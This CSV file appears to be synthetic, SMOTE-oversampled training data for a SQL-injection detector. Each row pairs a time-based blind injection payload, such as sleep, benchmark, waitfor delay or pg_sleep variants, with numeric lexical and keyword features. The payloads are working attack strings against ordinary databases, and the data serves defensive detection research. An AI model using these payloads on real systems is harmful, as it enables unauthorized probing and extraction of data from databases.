id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000155,attack,time,"1"" and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and ""mynm"" like ""mynm",nearest_attack_euclidean,R000257,0.9731616402251574,84.86226163972165,28.39556019290843,3.9344209946486055,27.884460675179508,19.884460675179504,27.093340289362644,10.0,0.3278133350950541,0.2326684482027822,0.32058710808682367,0.11893110861533994,0.0,3.6977800964542156,0.0,0.0,0.0,1.0,0.0,4.0,0.3022199035457849,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.30221990354578493,0.0,0.0,0.0,1.6977800964542151,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000156,attack,time,"1""  )   as amak where 7938  =  7938 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000212,0.2673901587711731,85.07360905937378,27.518402264843445,3.605912895893705,20.555206794530335,18.0,35.518402264843445,11.0,0.24075128645684798,0.2119416611277858,0.41778714839283043,0.1295199040225358,0.0,1.0,2.0,0.0,0.0,2.0,0.0,5.0,0.0,0.0,1.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000157,attack,time,select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,nearest_attack_euclidean,R000019,0.49572319818831195,55.03257433979445,19.196742566020554,3.389795702712981,25.803257433979446,1.1967425660205553,21.229316905815004,6.803257433979446,0.471048428854861,0.022464259769830977,0.3827255893304154,0.12376172204489258,3.1967425660205553,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,3.60651486795889,0.0,0.0,0.0,2.220446049250313e-16,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.803257433979445,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8032574339794447
SMOTE_000158,attack,time,1'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000136,0.502602761508096,89.20598443800758,19.199335062443602,2.806083007024034,27.0,2.0,47.60465456289478,12.601329875112794,0.30319464221037196,0.022458862385953487,0.5332257206862844,0.1411207747173902,1.0,-1.1102230246251565e-16,0.0,0.0,1.0,0.0,0.0,9.800664937556398,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.8006649375563972,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000159,attack,time,"1   )    )    as hrks where 7637  =  7637 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000205,0.8419587749017708,86.36889470533998,22.703626037123158,3.2973942556408464,19.221756222738943,18.0,38.443512445477886,10.703626037123158,0.22150905057770146,0.21074447517925554,0.4430181011554029,0.12472837308764005,0.0,0.29637396287684276,2.0,0.0,0.0,2.0,0.0,5.407252074246315,0.0,0.0,1.0,4.0,0.0,0.29637396287684287,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000160,attack,time,select sleep  (  5  )  --,nearest_attack_euclidean,R000177,0.12590444386041236,25.426292009497566,11.255775205698537,2.968124449107256,11.34103360759805,1.0,9.085258401899512,4.0,0.4451155041139708,0.03943161065400326,0.357726442616013,0.15772644261601299,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9999999999999998
SMOTE_000161,attack,time,1'||  (  select 'bwqc' from dual where 6897  =  6897 and sleep  (  5  )  #,nearest_attack_euclidean,R000125,1.5105652386961,71.54405962720291,29.362706418135275,4.054470053907787,29.362706418135275,10.0,22.45423547271176,9.72711773635588,0.40955809282717676,0.14024104027608542,0.3141580152921004,0.13604285160463742,3.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,2.727117736355879,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.7271177363558793,1.0,0.0,1.0,0.7271177363558793,0.7271177363558793,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.454235472711758
SMOTE_000162,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'dvpw'  =  'dvpw",nearest_attack_euclidean,R000200,0.556550226741871,85.86590734326187,29.173181468652373,3.9177857553687656,30.653637062695253,16.03908881191424,29.346362937304747,9.826818531347627,0.357348499697775,0.18631816194297812,0.34174242310017117,0.11459091525907576,2.6536370626952532,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,5.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.1731814686523736,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.8268185313476266,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8268185313476266
SMOTE_000163,attack,time,1  )   where 2468  =  2468 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000173,0.10722040746846806,104.04626362900541,28.0,3.32639888530979,33.0,10.0,49.0,12.046263629005416,0.31716788463762097,0.0961114801932185,0.47094625294677056,0.11577438222238995,0.0,0.04626362900541525,0.0,0.0,1.0,1.0,0.0,9.0,0.0,0.0,0.0,2.0,0.0,0.046263629005415086,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000164,attack,time,"1'+  (  select 'dbvq' where 2045  =  2045 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000311,0.40932016105989494,107.16860238259808,31.83139761740192,3.955712019469161,31.325590469607686,27.0,36.180216678186554,12.662795234803843,0.29235400692323327,0.251942517797668,0.3375200849061118,0.11818339037298686,2.6627952348038426,-1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,5.1686023825980785,0.0,0.0,1.0,2.8313976174019215,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.8313976174019213,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8313976174019215
SMOTE_000165,attack,time,"1""  )   as gdcx where 2335  =  2335 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000035,0.68684582225716,95.72579052011558,29.298383682881912,3.7625793061384845,29.36289526005779,18.0,37.596767365763824,10.76612789429397,0.3059331104720307,0.1888218384596458,0.39260536410292457,0.11263968696539889,0.0,1.0,2.0,0.0,0.0,2.0,0.0,4.76612789429397,0.0,1.0,0.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.7661278942939703,0.23387210570602981,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000166,attack,time,"1""   )    )    waitfor delay '0:0:5' and    (    (   ""witb""  =  ""witb",nearest_attack_euclidean,R000054,1.1856548903064223,62.12905504446263,24.47234534761515,3.7288921242351623,23.0,4.0,23.110618609539397,12.018436434923233,0.37497542397295375,0.06521311721268762,0.36571543814724694,0.1940960206671117,2.0,4.0,0.0,0.0,0.0,1.0,0.0,3.0184364349232333,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000167,attack,time,"1  )   as skby where 4269  =  4269 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000103,0.21573715255205822,86.36589999525037,25.414614287749842,3.460813997092904,21.0,18.0,37.170771424500316,10.195128570750052,0.24339080563935322,0.20862069054801705,0.4299671574492984,0.11802134636333131,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,5.195128570750053,0.0,0.0,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000168,attack,time,"1""   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   ""zlwb""  =  ""zlwb",nearest_attack_euclidean,R000302,0.31120582662559626,112.42324098106114,28.71783934595924,3.490906940594217,25.43567869191848,21.564321308081517,50.56432130808152,14.85891967297962,0.22652782596756055,0.19160986122146234,0.44960971076362544,0.1322526020473517,0.0,3.7178393459592396,0.0,0.0,0.0,2.0,0.0,8.14108032702038,0.0,0.0,1.0,2.0,0.0,0.9294598364898099,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000169,attack,time,1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   'wevl'  =  'wevl,nearest_attack_euclidean,R000024,0.07754891035766641,123.25705860984621,24.0,3.0003581941025197,39.0,2.0,64.36319309415389,17.893865515692312,0.31664037494252184,0.016237967945770357,0.5219448045480263,0.14517685256368149,4.0,-1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,11.893865515692314,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000170,attack,time,1'   )    )    waitfor delay '0:0:5' and    (    (   'amnf' like 'amnf,nearest_attack_euclidean,R000146,1.1289196019948435,66.27371748635854,21.751581165757234,3.576441985733413,27.0,3.7515811657572344,24.267392823329587,11.254743497271706,0.41184665658917397,0.056497613417551246,0.36216288974062105,0.1694928402526538,5.006324663028941,0.745256502728294,0.0,0.0,0.0,0.0,0.0,3.5031623315144707,0.0,0.0,0.0,2.220446049250313e-16,1.0,0.24841883424276467,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000171,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000132,0.8957103708340132,82.22451212230644,29.504634159580647,3.930040938388471,32.49536584041935,10.0,27.486097521258056,12.243048760629028,0.3959772967248859,0.12205959916962411,0.33351469598728906,0.14844840811820093,3.747682920209676,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,3.7476829202096757,0.0,0.0,0.0,4.495365840419352,1.0,0.0,0.0,0.2523170797903239,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,0.25231707979032386,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.252317079790323
SMOTE_000172,attack,time,"1""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  ""sdps""  =  ""sdps",nearest_attack_euclidean,R000105,1.1101825746369722,132.3599237048092,25.0,2.951367964534994,38.85877864988776,3.7129770800897903,70.43053437986532,19.35763359496633,0.29269877808252337,0.029550484149937786,0.5315915870743086,0.14615915069323016,0.0,4.0,0.0,0.0,0.7858778649887762,1.2141221350112237,0.0,13.143511459955105,0.0,0.21412213501122374,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.7858778649887763,0.0,0.0,1.0,1.2141221350112237,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7858778649887762,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.785877864988776
SMOTE_000173,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000215,0.5756572715375342,91.62357696498925,22.207858988329754,3.0208719567912525,28.623576964989258,1.2078589883297521,46.58428202334049,15.207858988329752,0.31228493673069013,0.013127377948681115,0.5086347377565456,0.1659529475640833,0.0,3.207858988329753,0.0,0.0,1.0,1.0,0.0,8.792141011670248,1.2078589883297526,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.2078589883297526,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.207858988329753
SMOTE_000174,attack,time,1 where 7299  =  7299 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000142,0.009686155546039882,46.06863469571419,19.013073275374133,3.4883433703729274,15.019609913061199,10.0,16.039219826122398,5.0098049565305995,0.32604559882060424,0.21716860903402274,0.3480551449935766,0.10873064715179642,0.003268318843532958,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,2.0065366376870664,0.0,0.0,0.0,3.0,0.003268318843532847,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9999999999999998
SMOTE_000175,attack,time,1  )   where 2468  =  2468 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000173,0.7186803660076624,104.33721000861375,28.0,3.3281350740422364,33.0,10.0,49.0,12.33721000861375,0.3162886510728705,0.09584504577965774,0.4696407243203229,0.11822557882714882,0.33721000861375017,-1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,9.0,0.0,0.0,0.0,2.0,0.33721000861375017,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000176,attack,time,"1,  (  select   (  case when   (  1609  =  1609  )   then waitfor delay '0:0:5' else 1609*  (  select 1609 from master..sysdatabases  )   end   )    )   ",nearest_attack_euclidean,R000077,7.922209712088862,139.09664223246142,29.364310850877814,3.67463314058693,53.95909824342525,15.910777127194537,53.45353372368328,15.77323313815836,0.3816916727705866,0.11162827790473641,0.3928962435254577,0.11378380579921925,1.5910777127194538,-1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,8.817844574561093,0.0,0.0,0.5910777127194538,2.0,1.0,0.0,0.0,0.4089222872805462,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.40892228728054625,1.0,0.0,0.40892228728054625,0.0,0.0,0.0,0.0,0.0,0.0,0.40892228728054625,0.0,0.5910777127194538,0.5910777127194538,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5910777127194538,0.5910777127194538,6.5910777127194535
SMOTE_000177,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",nearest_attack_euclidean,R000161,0.23503942397835909,80.3270314766676,21.19905472150014,3.0385579356249743,28.13270314766676,2.0,39.92892203366732,10.26540629533352,0.3510199037615371,0.024977104851894236,0.49643659545706204,0.12756639592950672,0.0,1.0,0.0,0.0,1.0,0.0,0.0,8.19905472150014,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.06635157383337986,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.9336484261666201,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.93364842616662
SMOTE_000178,attack,time,1 where 8921  =  8921 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R000044,0.605372497942789,99.58029223588252,26.43065699667824,3.3983788944711186,34.57299274750868,8.86131399335648,44.2883212458478,11.85766424916956,0.3478817799296421,0.08743380680086918,0.4453628162008953,0.11932159706859341,0.0,-1.1102230246251565e-16,2.0,0.0,1.0,0.8576642491695601,0.0,8.0,0.0,0.0,0.0,3.8576642491695603,0.0,0.0,1.0,0.0,0.0,0.8576642491695601,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.8576642491695601,1.0,0.14233575083043992,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000179,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   -- kvkk",nearest_attack_euclidean,R000240,0.9772806793380313,73.77005156110158,27.22994843889841,3.844300904609048,19.0,22.0,25.0,7.770051561101589,0.2575655350498093,0.29823377742609497,0.33890201980238066,0.10529866772171508,0.0,-1.1102230246251565e-16,1.5401031222031765,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,2.5401031222031767,0.0,0.0,0.7700515611015882,0.2299484388984117,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9999999999999998
SMOTE_000180,attack,time,1'  )   as jxtg where 1071  =  1071 and sleep  (  5  )  --,nearest_attack_euclidean,R000293,0.048892336914644154,57.97157048036651,23.97157048036651,3.6201566255879034,18.985785240183255,10.0,22.0,6.9857852401832545,0.3274986775873353,0.1725013224126647,0.3795029093078623,0.1204970906921377,0.985785240183255,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,3.0,0.985785240183255,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.985785240183255,0.014214759816745026,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000181,attack,time,1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,nearest_attack_euclidean,R000126,0.0850857515158017,62.481354773491915,21.87033869337298,3.325388938829825,17.805508040059472,10.0,27.74067738674596,6.93516934668649,0.2847290174268463,0.1604817467967176,0.4438313886211488,0.1109578471552872,0.967584673343245,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,3.9675846733432447,0.0,0.0,0.0,1.0,0.967584673343245,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000182,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000269,0.503821237557425,60.328501203076584,25.0,3.9921796520385304,21.131400481230635,12.0,18.508533974974178,8.688566746871771,0.34953400111053223,0.2018639955578711,0.30343267172575794,0.14516933160583875,2.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,1.6885667468717722,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000183,attack,time,"1   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   8280  =  8280",nearest_attack_euclidean,R000139,0.12507806518355594,110.03756839046738,25.0,3.263680180340758,18.0,30.0,50.83005471237391,11.207513678093475,0.16369776956068055,0.2728296159344676,0.4616912762412603,0.10178133826359169,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,8.207513678093477,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000184,attack,time,1' where 7828  =  7828 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000119,0.6649168577559424,89.76273169178205,27.50134017808232,3.665195214639445,25.504020534246962,18.0,36.008041068493924,10.25067008904116,0.2838841838018351,0.20206683592171076,0.3993793376689113,0.11466964260754278,0.7493299109588396,-1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,4.50134017808232,0.0,1.0,0.0,4.0,0.7493299109588397,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000185,attack,time,"1""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  ""sdps""  =  ""sdps",nearest_attack_euclidean,R000105,1.0875202124207282,130.49400924962333,25.423537750028974,2.97033465797646,39.72938674991308,2.0,69.61169799976821,19.152924499942053,0.30463547457876744,0.01536417871238363,0.5332453522684106,0.14675499444043832,0.0,4.0,0.0,0.0,1.0,1.0,0.0,13.152924499942054,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.42353775002897287,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.423537750028973
